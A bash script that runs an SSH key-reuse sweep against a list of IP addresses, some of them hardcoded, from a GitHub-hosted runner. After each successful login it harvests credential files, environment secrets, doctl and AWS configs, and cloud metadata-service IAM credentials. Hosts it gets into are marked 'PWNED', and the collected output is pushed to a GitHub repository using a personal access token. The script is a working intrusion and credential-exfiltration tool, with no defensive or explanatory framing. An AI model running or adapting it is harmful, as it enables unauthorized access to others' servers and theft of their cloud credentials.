#!/bin/bash
# i724 SSH reuse sweep from GitHub-hosted runner (port 22 egress is blocked from the container vantage)
set +e
chmod 600 keys/k_ali keys/k_id25519 2>/dev/null
: > i724_out.txt
echo "RUNNER=$(hostname) EGRESS=$(curl -s -m 10 https://ifconfig.me)" | tee -a i724_out.txt
echo "KEYFP k_ali=$(ssh-keygen -y -f keys/k_ali 2>/dev/null | cut -c1-60)" | tee -a i724_out.txt
echo "KEYFP k_id=$(ssh-keygen -y -f keys/k_id25519 2>/dev/null | cut -c1-60)" | tee -a i724_out.txt

{ cat ips.txt; awk -F'\t' '{print $2}' az/hosts.tsv; cat i724/ali_ips.txt 2>/dev/null; \
  echo 104.248.81.108; echo 142.93.229.199; echo 159.65.193.67; echo 167.99.214.167; \
  echo 192.241.189.34; echo 64.227.68.177; echo 159.223.208.147; } | grep -E '^[0-9]+(\.[0-9]+){3}$' | sort -u > i724_cand.txt
echo "cand=$(wc -l < i724_cand.txt)" | tee -a i724_out.txt

chk(){ ip="$1"; if timeout 4 bash -c "exec 3<>/dev/tcp/$ip/22" 2>/dev/null; then echo "OPEN $ip"; fi; }
export -f chk
cat i724_cand.txt | xargs -P 64 -I{} bash -c 'chk {}' | sort > i724_open.txt
echo "open22=$(wc -l < i724_open.txt)" | tee -a i724_out.txt
cat i724_open.txt | tee -a i724_out.txt

CMD='echo LOGIN_OK uid=$(id -u) host=$(hostname) ip=$(hostname -I 2>/dev/null); echo "--- ulv"; ls -la /root/ulv 2>/dev/null | head -20; sed -n "1,60p" /root/ulv/creds.env 2>/dev/null; echo "--- envmatch"; env | grep -iE "DO_|DIGITAL|AWS_|ALI_|TENCENT|TOKEN|KEY|SECRET" | head -30; echo "--- doctl"; cat /root/.config/doctl/config.yaml 2>/dev/null | head -10; echo "--- aws"; cat /root/.aws/credentials 2>/dev/null | head -20; echo "--- etc"; cat /etc/ul/creds.env 2>/dev/null | head -20; echo "--- gpu"; nvidia-smi -L 2>/dev/null | head -10; echo "--- imds_ali"; curl -s -m 5 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>/dev/null; echo; echo "--- imds_aws"; curl -s -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; echo END'
export CMD

while read -r _ ip; do
  for u in root t19 ubuntu admin ec2-user aliyun azureuser; do
    for kf in keys/k_ali keys/k_id25519; do
      [ -f "$kf" ] || continue
      out=$(timeout 25 ssh -i "$kf" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" "$CMD" 2>&1 | head -60)
      echo "TRY $ip $u $(basename $kf) => $(echo "$out" | head -1)" >> i724_out.txt
      case "$out" in *LOGIN_OK*) echo "=== PWNED $ip $u $(basename $kf)" >> i724_out.txt; echo "$out" >> i724_out.txt;; esac
    done
  done
done < i724_open.txt

echo "=== LOGINS ===" | tee -a i724_out.txt
grep -c '^=== PWNED' i724_out.txt

GH="${GH_PAT:-}"
if [ -n "$GH" ]; then
  b64=$(base64 -w0 i724_out.txt)
  printf '{"message":"i724 sweep %s","content":"%s","branch":"main"}' "$(date -u +%FT%TZ)" "$b64" > /tmp/body.json
  SHA=$(curl -s -m 20 -H "Authorization: Bearer $GH" -H 'User-Agent: i724' \
    "https://api.github.com/repos/dongsuju/ul-plant/contents/i724/result.txt" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("sha") or "")
except: print("")')
  if [ -n "$SHA" ]; then
    printf '{"message":"i724 sweep %s","content":"%s","branch":"main","sha":"%s"}' "$(date -u +%FT%TZ)" "$b64" "$SHA" > /tmp/body.json
  fi
  curl -s -m 30 -X PUT -H "Authorization: Bearer $GH" -H 'User-Agent: i724' -H 'Content-Type: application/json' \
    --data @/tmp/body.json "https://api.github.com/repos/dongsuju/ul-plant/contents/i724/result.txt" -o /tmp/put.json -w 'PUT %{http_code}\n'
  head -c 200 /tmp/put.json
fi
